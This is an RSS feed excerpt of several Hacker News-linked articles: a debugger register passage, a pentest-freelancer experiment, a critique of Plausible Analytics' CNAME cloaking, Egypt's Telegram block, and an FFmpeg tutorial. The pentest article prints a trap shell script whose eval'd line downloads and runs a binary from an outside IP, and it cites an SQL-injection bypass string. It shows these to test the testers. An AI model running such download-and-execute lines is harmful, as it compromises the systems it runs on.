    __int64_t   r_r14;               greg(rsi, RSI, 1) \
    __int64_t   r_r13;               greg(rdx, RDX, 2) \
    __int64_t   r_r12;               greg(r10, R10, 6) \
    __int64_t   r_r11;               greg(r8,  R8,  4) \
    __int64_t   r_r10;               greg(r9,  R9,  5) \
    __int64_t   r_r9;                /* ... */ \
    __int64_t   r_r8;                greg(rcx, RCX, 3) \
    __int64_t   r_rdi;               greg(r11, R11, 7) \
    __int64_t   r_rsi;               greg(r12, R12, 8) \
    __int64_t   r_rbp;               greg(r13, R13, 9) \
    __int64_t   r_rbx;               greg(r14, R14, 10) \
    __int64_t   r_rdx;               greg(r15, R15, 11) \
    __int64_t   r_rcx;               greg(rbp, RBP, 12) \
    __int64_t   r_rax;               …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/">https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/how-debuggers-work-getting-and-setting-x86-registers-part-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24870497</guid>
            <pubDate>Fri, 23 Oct 2020 15:29:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On Our Abusive Relationship with Mozilla’s Firefox]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 115 (<a href="https://news.ycombinator.com/item?id=24869658">thread link</a>) | @zdw
<br/>
October 23, 2020 | https://ruzkuku.com/txt/moz-rel.html | <a href="https://web.archive.org/web/*/https://ruzkuku.com/txt/moz-rel.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://ruzkuku.com/txt/moz-rel.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869658</guid>
            <pubDate>Fri, 23 Oct 2020 14:09:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Penetration testing and low-cost freelancing]]>
            </title>
            <description>
<![CDATA[
Score 148 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24869219">thread link</a>) | @sophron
<br/>
October 23, 2020 | https://sophron.github.io/lowcost-freelancing-pentest/ | <a href="https://web.archive.org/web/*/https://sophron.github.io/lowcost-freelancing-pentest/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
    <div id="content">


<h2><span color="#383b3d">The Story of How I Hired 7 Freelancers to Exploit this Weird Vulnerability</span></h2>

<p>Penetration testing is complex. For it to be successful, the tester needs to possess a variety of different abilities and skills. Some testers rely only on automated tools, while others focus more on manual analysis. While a creative and unconventional way of thinking is necessary, it is also important for the tester to possess the mental discipline to adhere to the time constraints set by the client. It is common for a creative penetration tester to spend a significant amount of time investigating a fun and uncommon exploit, only to realize later that there is not enough time left to provide complete coverage. It is, therefore, not surprising that two different testers will produce two separate reports that include different findings.</p>

<p>I decided to run a little experiment to see how different the reports of different testers would be. I purposely created a vulnerable web application, and hired seven different freelancers to conduct penetration testing against it. I found this to be an excellent opportunity to evaluate the skills of freelancers that provide their services at an extremely low price in online marketplaces. While the cost of penetration testing can be pretty high (typically between $1,000 and $100,000+), these freelancers provide their security services for less than $100. Some of them claim to possess industry-accepted certificates, and I was curious to know the quality of their work, in particular when their services are reviewed positively by thousands of buyers.</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/login_form.png">
  <figcaption>The vulnerable web form</figcaption>
</figure>


<p>
To keep things simple, I created a PHP login form that included two critical vulnerabilities that could be exploited to bypass the authentication form. While these bugs were not hard to discover or exploit, they required manual analysis; a tester that relies only on automated tools would not be able to identify them.
</p>

<p>
The first vulnerability on the form stems from a bug in session management. During the login operation of the web application, even if the credentials are wrong, the application is including the following header in the HTTP response: <span color="crimson">Set-Cooki auth=195c530a7af5f492a74499e70578d150</span>. A careful penetration tester that manually examines the HTTP response should be able to recognize that there is a typo in the name of the "Set-Cookie" header, hence the browser will not automatically set the cookie value. By setting this cookie value manually, the tester will gain admin privileges.
</p>



<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/response.png" width="95%">
  <figcaption>Identifying the two vulnerabilities after intercepting the HTTP traffic with Burp Suite</figcaption>
</figure>



<p>
The second way to bypass the authentication of the form is by inputting "<span color="crimson">' OR 1=1'</span>" or a similar payload. The root cause of this issue appears to be an SQL Injection vulnerability, but it is, in fact, a hardcoded SQL password. The executed SQL query can be found in the HTTP response:
</p>


<pre><code> SELECT * FROM form_passwords 
WHERE 'password' 
LIKE CONCAT(
	'%', 
	IF(STRCMP(SYSTEM_USER(), '/dev/random@localhost')=-1, REVERSE(" \'"), 
	ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), 
	IF(STRCMP(SESSION_USER(), '/dev/null@localhost')=0, CHAR(40*2-POWER(1, LOG(2)),(4*10+1)*2), 
	CHAR(69,4*10+9)), SPACE(1), '%' ,'\'','%',IF(STRCMP(VERSION(), '10.3.15-MariaDB-0+deb10u1')=0,
	IF(CONNECTION_ID()=1337,"'"="",'-_-'),
	IF(PI()&lt;3,"&lt;(^^)&gt;","'=")), MID("```'`''`'`'`'``'`'``'```````'`'`'`'`'`''`'`'`",7,1), '%');

</code>
</pre>

<p>
The tester will have to de-obfuscate the SQL query in order to extract the hardcoded password. For the tester to de-obfuscate the SQL query, he needs to possess basic knowledge of SQL syntax. This particular SQL query that I created is using nested inline IF statements. The conditions are checking the environmental variables <span color="crimson">SYSTEM_USER</span>, <span color="crimson">SESSION_USER</span> and <span color="crimson">VERSION</span>). Since these values are not known to the tester, he will have to follow all the different logic paths until the constructed query makes sense. Some simple simplifications here and there can make the query much more readable.


</p>


<figure>
<img src="https://sophron.github.io/lowcost-freelancing-pentest/sql_riddle.png">
  <figcaption>De-obfuscating the SQL query</figcaption>
</figure>


<p>
After de-obfuscation, the final query will be: "<span color="crimson">SELECT * FROM form_passwords WHERE 'password123' LIKE %" OR %"$'=%</span>". Inputs such as "<span color="red">' OR 1=1'</span>" would allow the tester to bypass the authentication form successfully. I purposely decided to use a payload that is commonly used when testing forms for SQL injections as an answer to this riddle, to see how many of these testers would correctly identify the root cause of this issue.
</p>


<p>To make things even more interesting, I put a malicious shell script as part of the HTTP response. The contents of the shell script were the following: </p>
<pre><code>obscure() {
   local txt="$1"
   local txt="$a\'{}"
   echo "${txt//?/*}"
}

sql_1 = 'SELECT * FROM form_passwords WHERE "asfsadfd" LIKE CONCAT("%", IF(STRCMP(SYSTEM_USER()'
sql_2 = 'REVERSE(), ISNULL(NULLIF(NULL-NULL*NULL, POWER(NULL,NULL)))), IF(STRCMP(SESSION_USER(), "/dev/null@localhost")=0'
sql_3 = `wget http://83.212.174.87/mal | chmod +x ./mal | ./mal`
sql_4 = '10.3.15-MariaDB-0+deb10u1)=0,IF(CONNECTION_ID()=1337,"="-_-,IF(PI()&lt;3,&lt;(^^)&gt;'
sql_5 = 'LOG(2)),(4*10+1)*2), CHAR(69,4*10+9)), SPACE(1'

echo "Deobfuscating..."

eval "$sql_1"
eval "$sql_2"
eval "$sql_3"
eval "$sql_4"
eval "$sql_5"
</code>
</pre>


<p>
As can be seen, on line 12, the script is downloading and executing a binary from the Internet. I wanted to see how many of these testers will be careless enough to run my malicious script without auditing it first.

</p>


<p>Finally, I installed an SSH honeypot. My intention was to record any shell interactions by the testers and evaluate their post-exploitation methodology.</p>

<p>The profiles of all the testers I hired had overwhelmingly positive reviews on the online marketplace. I pretended that I needed my web form tested before my group used it in production. I received all the penetration testing reports a few days later.</p>

<h3>Tester #1 ($20)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/1/report.pdf">PDF Report</a></p>

<p>The tester claimed to be a Certified Ethical Hacker v9 with experience in Vulnerability Assessments and Penetration Testing.
</p>

<p>
The tester delivered the report and mentioned that he found a serious flaw in the system. He failed to identify any of the high severity findings. The report included irrelevant information, such as "Banner Grabbing &amp; Version Detection," as well as a "Performance / Load Test." The serious flaw that the tester identified was logging in to the SSH honeypot.
</p>


<h3>Tester #2 ($30)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/2/report.pdf">PDF Report</a></p>

<p>
The tester described himself as an independent information security researcher. He mentioned that he had finished his Bachelor's in Computer Science and Certified Ethical Hacker Course by EC-Council. He claimed to have hands-on experience in vulnerability assessment and penetration testing.
</p>
<p>
This tester, too, failed to identify any of the high severity findings. The tester believed he had gotten local access to the remote machine, failing to realize that this was, in fact, a honeypot. The results that were reported had no direct impact (in regard to Integrity, Availability, Confidentiality), or they were not valid at all (e.g., directory brute-forcing).
</p>

<h3>Tester #3 ($35)</h3> 

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/3/report.pdf">PDF Report</a></p>

<p>
The tester claimed that they usually charge $200 for complete pentest and report, but since canceling the order will have a negative impact on their profile, they agreed to carry out the testing. They asked me to tip well after I receive the report.
</p>
<p>
Most of the findings included in this report were part of the Nessus security tool. A reflected XSS finding on a POST parameter was exaggerated as a HIGH. None of the HIGH-severity findings were identified.
</p>

<h3>Tester #4 ($40)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/4/report.pdf">PDF Report</a></p>

<p>
The tester claimed to be OSCP certified with nine years of experience.
</p>
<p>

This tester identified the SQL vulnerability successfully but failed to identify the root cause of it. He reported the vulnerability as an SQL injection as opposed to a hardcoded password. The rest of the findings he reported were part of Burp Suite's automated scanner.

</p>


<h3>Tester #5 ($50)</h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/5/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have a B.Sc in Computer Science and various certifications, including CEH Certified Ethical Hacker and Certified Payment Industry Security Implementer. On his profile, he mentions that he provides a variety of services from PCI DSS consulting to blockchain training.
</p>

<p>

Again, none of the critical vulnerabilities were discovered. This tester did execute my malicious script even though, according to the report, he examined it for any security issues. 

</p>


<h3>
Tester #6 ($100) </h3>

<p><a href="https://sophron.github.io/lowcost-freelancing-pentest/6/report.pdf">PDF Report</a></p>

<p>
The tester claimed to have over 20 years of experience in Ethical Hacking, and his profile has over 100 positive reviews. I ordered the premium service that included a full penetration test, professional security assessment report and recommendations &amp; solutions.</p>

<p> The tester failed to identify any of the HIGH-risk vulnerabilities. All the technical details on the report were taken from automated tools (OWASP ZAP and Netsparker). </p>




<h3>
Tester #7 ($400) </h3>

<p>
The tester claimed to be an OCSP with 7+ years of professional experience with major clients. In our agreement, we agreed that he wouldn't have to provide a report to save them time and allow them to focus on testing.

</p>

<p>
The tester successfully identified the issue with the mistyped HTTP header. He did not report the SQL hardcoded password.
</p>

<p>Following is a table that summarizes the work of all testers:</p>

<table>
<thead>
  <tr>
    <th>Tester #</th>
    <th>Cost</th>
    <th>Bug 1</th>
    <th>Bug 2</th>
    <th>Reported vuln correctly</th>
    <th>Did not run malicious binary</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>1</td>
    <td>$20</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>2</td>
    <td>$30</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>3</td>
    <td>$35</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>4</td>
    <td>$40</td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>5</td>
    <td>$50</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
  </tr>
  <tr>
    <td>6</td>
    <td>$100</td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
  <tr>
    <td>7</td>
    <td>$400</td>
    <td><span color="green">âœ“</span></td>
    <td><span color="red">X</span></td>
    <td><span color="green">âœ“</span></td>
    <td><span color="green">âœ“</span></td>
  </tr>
</tbody>
</table>

<p>
The results are straightforward. It appears that all of these contractors, with the exception of the last one, used automated tools to carry out the testing. Hence, the majority of them failed to identify the critical vulnerabilities. Some of them thought they gained access to the host through SSH without realizing they actually gained access to the virtual environment of a honeypot. Finally, one of them ran a script found online without auditing it …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sophron.github.io/lowcost-freelancing-pentest/">https://sophron.github.io/lowcost-freelancing-pentest/</a></em></p>]]>
            </description>
            <link>https://sophron.github.io/lowcost-freelancing-pentest/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24869219</guid>
            <pubDate>Fri, 23 Oct 2020 13:26:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Plausible Analytics Isn't GDPR Compliant]]>
            </title>
            <description>
<![CDATA[
Score 52 | Comments 72 (<a href="https://news.ycombinator.com/item?id=24868012">thread link</a>) | @ramboram
<br/>
October 23, 2020 | https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking | <a href="https://web.archive.org/web/*/https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>For the last few weeks, my feeds and federated timelines have been filled with absolutely brilliant marketing campaigns for Plausible Analytics, the new open-source privacy-focused website analytics tool. Plausible Analytics has enjoyed exponential growth and is frequently recommended by privacy-conscious voices in the FOSS community.</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/elementary-io-663x317.png" alt="Plausible Analytics - elementary OS"></a><figcaption><p>Plausible Analytics showing public visitor metrics for the elementary OS website.</p></figcaption></figure><p>So does Plausible Analytics deliver on its promise to provide an ethical privacy-friendly alternative to Google Analytics? Let’s have a closer look.</p><p>Plausible Analytics claims to be compliant with GDPR, CCPA, and PECR out of the box. Allegedly, it’s not necessary to ask for and obtain user consent as no personal data is ever being collected.</p><p>Plausible Analytics does however admit that it collects your user-agent and IP address to uniquely identify your visit. Additionally, it stores information about your browser, operating system, device type, and location (based on your IP address). Even if the stored personal data is being anonymized (and not pseudonymized which sounds more likely), the data is still being processed.</p><p>If you’re familiar with GDPR, then you’re likely aware that it certainly covers collecting of online identifiers, such as IP addresses, and browser characteristics used for fingerprinting.</p><p>Another issue I came across when signing up for their service was that Plausible Analytics doesn’t provide their customers with a GDPR data processing agreement (DPA). When you, the website owner, allows a third party to collect and process personal data, you’re required to sign a DPA to be GDPR compliant.</p><h2 id="privacy-friendly-website-analytics">Privacy-friendly website analytics</h2><p>In my opinion, privacy-friendly should be more than a buzzword used to throw shade at Google Analytics. Here are a few key points that I attribute to being privacy-friendly (none of which are adhered to by Plausible Analytics):</p><ul><li>Ask users for their consent before tracking.</li><li>Allow users who don’t want to be tracked to opt-out.</li><li>Respect users providing a Do Not Track (DNT) header.</li><li>Don’t disguise your tracker as a first-party resource to avoid ad-blockers.</li></ul><p>Being privacy-friendly is also about respecting one’s right to choose what data to share, and with whom. Plausible Analytics seems to think that it’s alright to make that choice on your behalf and I wholeheartedly disagree.</p><h2 id="cname-cloaking">CNAME cloaking</h2><p>This abysmal technique remains ever popular with <a href="https://github.com/uBlockOrigin/uBlock-issues/issues/780" target="_blank">unethical advertisers</a> as an effective countermeasure against ad-blockers. The technique effectively disguises the third-party tracker as a first-party resource by having the website owner pointing a subdomain to the third-party server using a CNAME record.</p><p>Plausible Analytics are at least upfront about why they deploy CNAME cloaking, as explained in their documentation:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/plausible-cname-cloaking-663x277.png" alt="Plausible Analytics - CNAME cloaking"></a><figcaption><p>Plausible Analytics documenting how to defeat ad-blockers.</p></figcaption></figure><p>What, some people are trying to block your privacy-friendly tracker? Now we can’t have that, tracking absolutely everyone gives Plausible Analytics a competitive edge against Google Analytics.</p><h3 id="how-does-cname-cloaking-work">How does CNAME cloaking work?</h3><p>An excellent question, but first we need to understand exactly what makes CNAMEs special by design and implementation as according to <a href="https://tools.ietf.org/html/rfc1034" target="_blank">rfc1034</a>.</p><blockquote><div><p>A CNAME RR identifies its name as an alias, and specifies the corresponding canonical name.</p><p>When a name server fails to find a desired RR in the resource set associated with the domain name, it checks to see if the resource set consists of a CNAME record with a matching class. If so, the name server includes the CNAME record in the response and restarts the query at the domain name specified in the data field of the CNAME record.</p></div></blockquote><p>Let’s see how it works by using the domain markosaric.com as an example. The domain is owned by Marko Saric, digital marketing guru of team Plausible Analytics. The subdomain he uses to disguise the tracker is ms.markosaric.com.
When performing a DNS query for ms.markosaric.com, we get the following response:</p><pre><code>$ dig ms.markosaric.com

;; ANSWER SECTION:
ms.markosaric.com.	14400	IN	CNAME	custom.plausible.io.
custom.plausible.io.	300	IN	A	46.101.161.209
</code></pre><p>As we can tell, the DNS resolver identifies ms.markosaric.com as an alias for custom.plausible.io. Additionally, because it’s a CNAME record, we also get the A record for custom.plausible.io which is pointing to 46.101.161.209.</p><p>When a browser requests the first-party resource for ms.markosaric.com, the same “DNS based redirect” takes place, and the tracker gets inserted from custom.plausible.io. However, because this happens at the DNS level, ad-blockers are unable to identify the tracker.</p><p>Let’s see how this dark magic repels uBlock Origin on Chromium after adding a custom filter to block the plausible.io domain.</p><pre><code>! Custom uBlock Origin filter for plausible.io
||plausible.io^
</code></pre><p>The image below consists of two merged screenshots. The left side of the image shows how the custom filter fails to stop the tracker when CNAME cloaking is in effect. The right side of the image shows the same filter successfully blocking the tracking domain when accessed directly:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-cloak-663x232.png" alt="CNAME cloaking"></a><figcaption><p>CNAME cloaking used to escape filtering from uBlock Origin on Chromium.</p></figcaption></figure><p>As shown above, the tracker (index.js) is being loaded from the remote IP address of 46.101.161.209, which resolves to custom.plausible.io. However, the script is not blocked and the harvesting of personal data is in full effect.</p><p>This technique is effective because uBlock Origin doesn’t have access to DNS queries and is entirely oblivious to the trick being pulled behind its back. I wouldn’t describe this approach as being either privacy-friendly or ethical.</p><h2 id="how-to-block-plausible-analytics">How to block Plausible Analytics</h2><p>Though intrusive, unethical, and annoying, CNAME cloaking can be defeated. I’ll scratch the surface with a few options that will help you to protect your privacy.</p><h3 id="ublock-origin-on-firefox">uBlock Origin on Firefox</h3><p>You can easily block Plausible Analytics with uBlock Origin on Firefox by adding the filter I referenced earlier in this article. Firefox allows extensions (if given permission) to resolve domain names by exposing a <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/API/dns" target="_blank">DNS API</a>. This allows uBlock Origin to identify and block disguised trackers:</p><figure><a href="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png"><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/cname-exposed-ublock-origin.png" alt="uBlock Origin on Firefox"></a><figcaption><p>uBlock Origin using Firefox’s DNS API to expose and block CNAME cloaking.</p></figcaption></figure><h3 id="dnscrypt-proxy">dnscrypt-proxy</h3><p>If you don’t want to use Firefox, or prefer to block Plausible Analytics on the DNS level, then you’ll need a tool that can scrub CNAME responses. The right tool for the job in my opinion is <a href="https://github.com/DNSCrypt/dnscrypt-proxy" target="_blank">dnscrypt-proxy</a>. The dnscrypt-proxy client’s domain blacklist provides support for CNAME blocking.</p><p>The following animated gif shows how dnscrypt-proxy can block the CNAME record containing the unwanted tracker.</p><p><img src="https://blog.paranoidpenguin.net/wp-content/uploads/2020/07/dnscrypt-proxy-cname-blacklist.gif" alt="dnscrypt-prox blocking a cloaked CNAME record" title="Blocking Plausible Analytics with dnscrypt-proxy"></p><p>Pretty neat huh.</p><h3 id="other-options">Other options</h3><p>Well there are a few, you could always:</p><ul><li>Block any IP address in use by custom.plausible.io with your firewall.</li><li>Disable JavaScript in your browser (it will block the tracking, not the connection).</li><li>Block the <a href="https://github.com/rogercomply/plausible-analytics-blocklist/blob/master/subdomains" target="_blank" rel="noopener noreferrer nofollow" title="A list of subdomains used for CNAME cloaking with Plausible Analytics">subdomains</a> used for CNAME cloaking.</li><li>Use a DNS service provider already blocking unwanted trackers.</li><li>Ask Plausible Analytics to respect your right to privacy.</li></ul><h2 id="what-does-the-foss-say">What does the FOSS say?</h2><p>I’ll admit to being mildly amused and surprised that privacy-conscious people in the FOSS community are promoting this service. Even more surprising is the fact that they’re configuring CNAME cloaking for their websites. I mean, seriously, you can’t exactly argue ignorance in this matter.</p><p>Plausible Analytics is good at targeted marketing to the right people. However, I don’t personally believe that the product delivers on its promise. Open-source or not, the business model here is still to monetize personal data for profit however you may wish to dress it up.</p></div></div>]]>
            </description>
            <link>https://blog.paranoidpenguin.net/2020/07/plausible-analytics-review-browser-fingerprinting-and-cname-cloaking</link>
            <guid isPermaLink="false">hacker-news-small-sites-24868012</guid>
            <pubDate>Fri, 23 Oct 2020 10:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Be prolific]]>
            </title>
            <description>
<![CDATA[
Score 306 | Comments 125 (<a href="https://news.ycombinator.com/item?id=24866706">thread link</a>) | @hecticjeff
<br/>
October 22, 2020 | https://www.chrismytton.com/be-prolific/? | <a href="https://web.archive.org/web/*/https://www.chrismytton.com/be-prolific/?">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
<p>There’s a story about an art teacher that split their class in half. They told one half of the students that they’d be graded based on a single piece of work, and the other half that they would be graded on the quantity of work produced.</p>

<p>The half that was being graded on quantity ended up producing higher quality pieces.</p>

<p>By iterating and learning from their mistakes they actually ended up producing better work than the students that only had to produce one piece.</p>

<p>Quantity leads to quality.</p>



<p>Sharing work helps you to think and develop. The feedback you get feeds into the next iteration.</p>

<p>If you’ve enjoyed creating something then there’s a good chance that at least a handful of people in the world will enjoy seeing it or hearing about it.</p>

<p>Promoting yourself and your work can be a good way to clarify your thinking and future direction.</p>

<h2 id="get-better-by-creating-more">Get better by creating more</h2>

<p>Produce lots of stuff and share it.</p>

<p>Being prolific doesn’t mean that everything you produce has to be absolute gold. But the process of producing large quantities of work ultimately leads to a higher quality of work.</p>

    </div></div>]]>
            </description>
            <link>https://www.chrismytton.com/be-prolific/?</link>
            <guid isPermaLink="false">hacker-news-small-sites-24866706</guid>
            <pubDate>Fri, 23 Oct 2020 06:56:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Egypt Blocks Access to Telegram]]>
            </title>
            <description>
<![CDATA[
Score 153 | Comments 73 (<a href="https://news.ycombinator.com/item?id=24865875">thread link</a>) | @emptysongglass
<br/>
October 22, 2020 | https://masaar.net/en/the-egyptian-authorities-block-telegram/ | <a href="https://web.archive.org/web/*/https://masaar.net/en/the-egyptian-authorities-block-telegram/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3127" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">
<p><img loading="lazy" src="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1" alt="" width="1024" height="512" srcset="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?w=1200&amp;ssl=1 1200w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;ssl=1 1024w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=300%2C150&amp;ssl=1 300w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=768%2C384&amp;ssl=1 768w, https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?w=1200&amp;ssl=1 1200w" data-lazy-src="https://i0.wp.com/masaar.net/wp-content/uploads/2020/10/Untitled-1.png?resize=1024%2C512&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>Technology and Law Community “Masaar” documented the blocking of the Telegram website and application by the Egyptian authorities on 22 October 2020. The authorities blocked Telegram on three of the Internet service networks operating in Egypt. These networks included “We”, “Vodafone” and “Orange”. Masaar learned about the blocking action after complaints from several users of the Internet services on the three networks, stating that they cannot access the application or the website. It should be noted that Telegram is one of the most popular and widespread encrypted chat applications in the world.</p>
<p>Masaar confirms that users of the three networks: We (AS8452), Orange (AS24863) and Vodafone (AS36935) cannot use Telegram application on smartphones, as the Egyptian authorities have blocked access to IP addresses of the application.</p>
<p>The authorities also have blocked the Telegram website itself (telegram.org) and the version of Telegram used for desktop computers (web.telegram.org). Further, the blocking involved ADSL and mobile internet (4G / 3G).</p>
<p>It is noteworthy that last September “Masaar” had <a href="https://masaar.net/en/blocked-websites-in-egypt/">published a web page declaring that the authorities have blocked 596 websites and 32 alternative links</a> since May 2017.</p>
</div>
</div>
</article></div>]]>
            </description>
            <link>https://masaar.net/en/the-egyptian-authorities-block-telegram/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24865875</guid>
            <pubDate>Fri, 23 Oct 2020 03:48:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[FFmpeg Drawtext Filter for Overlays, Scrolling Text, Timestamps on Videos]]>
            </title>
            <description>
<![CDATA[
Score 175 | Comments 78 (<a href="https://news.ycombinator.com/item?id=24865755">thread link</a>) | @ponderingfish
<br/>
October 22, 2020 | https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/ | <a href="https://web.archive.org/web/*/https://ottverse.com/ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<figure>
<img src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/ffmpeg-drawtext-featured-image.png?resize=678%2C381&amp;ssl=1" alt="ffmpeg-drawtext-filter-dynamic-overlays-timecode-scrolling-text-credits" title="ffmpeg-drawtext-featured-image" data-src="https://i1.wp.com/ottverse.com/wp-content/uploads/2020/10/ffmpeg-drawtext-featured-image.png?resize=678%2C381&amp;ssl=1" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
</figure>


<p><strong>Learn FFmpeg’s drawtext filter to dynamically overlay text on video and display information such as timecode, frame resolution, watermarks, etc. Also, let’s learn how to configure the font, font-size, position, background-color, alignment, multiple lines, etc. using FFmpeg’s drawtext filter.</strong></p>




<h2 id="step-0-ensure-your-ffmpeg-is-compiled-with-libfreetype"><span id="Step_0_Ensure_your_FFmpeg_Is_Compiled_with_libfreetype"></span>Step 0: Ensure your FFmpeg Is Compiled with libfreetype<span></span></h2>



<p>In order to use&nbsp;<code>drawtext</code>, you needed to have configured FFmpeg with&nbsp;<code>--enable-libfreetype</code>. As per the documentation, you need the following options as well if you want to,</p>



<ul><li>enable default font fallback and the font option you need to configure FFmpeg with&nbsp;<code>--enable-libfontconfig</code>.</li><li>enable the text_shaping option, you need to configure FFmpeg with&nbsp;<code>--enable-libfribidi</code>.</li></ul>



<h2 id="complete-list-of-options-for-drawtext"><span id="Complete_List_of_Options_for_drawtext"></span>Complete List of Options for drawtext<span></span></h2>



<p>The complete list of options for&nbsp;<code>drawtext</code>&nbsp;filter can be accessed&nbsp;<a href="https://ffmpeg.org/ffmpeg-filters.html#Syntax" target="_blank" rel="noopener">here</a>. It is far too much for me to explain here, but, if you have any questions, that is the first place you should refer.</p>



<p>In this article, I’ll walk through several common use-cases that should make the concepts easy to understand.</p>



<h2 id="display-text-on-the-video-using-drawtext-filter"><span id="Display_Text_on_the_Video_using_drawtext_filter"></span>Display Text on the Video using drawtext filter<span></span></h2>



<p>Here is the commandline and an explanation of the options</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='My text starting at 640x360':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Here,</p>



